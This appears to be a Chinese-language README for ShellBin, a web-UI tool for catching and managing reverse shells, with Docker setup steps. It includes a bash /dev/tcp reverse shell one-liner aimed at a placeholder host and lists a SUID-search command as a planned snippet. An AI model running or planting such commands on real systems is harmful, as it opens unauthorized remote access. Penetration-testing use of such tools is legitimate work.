# ShellBin

[中文文档](README_zh.md)

优雅地接收反向 Shell。

在一个端口上接收多个反向 Shell，并在 Web UI 中进行管理。

借助 [xterm.js](https://xtermjs.org/) 的使用，复杂的命令如 vi、tmux 和 Ctrl-C 可以正常工作（您可能需要获取 pty，并设置正确的 stty 大小。）

![屏幕截图](images/screenshot.png)

## 运行

建议使用来自 DockerHub 的 [docker 镜像](https://hub.docker.com/repository/docker/cwithw/shellbin)。

```bash
docker run -d --name shellbin -p 9998:3000 -p 9999:3001 -e USERNAME=root -e PASSWORD=toor cwithw/shellbin:latest
```

将 `USERNAME` 和 `PASSWORD` 的值更改为您自己的用户名和密码。
您还可以将 `9998`（Web UI 端口）和 `9999`（反向 Shell 端口）更改为您自己的端口。

然后访问 `http://your-ip:9998` 以查看 Web UI。

在端口 `9999` 上接收反向 Shell（`bash -i >& /dev/tcp/your-ip/9999 0>&1`）。

## 开发

```
make backend-environment
make frontend-environment
```

## 构建 Docker 镜像

```
make docker
```
```
make build-docker-image
```


## 安全性与性能

该应用程序处于原型阶段，通常是安全的，但性能未经优化，UI 也不够美观，

欢迎提交拉取请求。

## 路线图

- [x] 具有连接的反向 Shell 列表的 Web UI，并使用 [xterm.js](https://xtermjs.org/) 显示彩色 Shell
- [x] Web UI 需要身份验证
- [x] 接收反向 Shell
- [x] 自动删除断开的连接
- [ ] 时尚的 Web UI
- [ ] 调整终端大小并发送终端事件（目前需要执行 `stty` 命令）
- [ ] 代码片段（例如 `find / -perm 4000 2>/dev/null`）
- [ ] API管理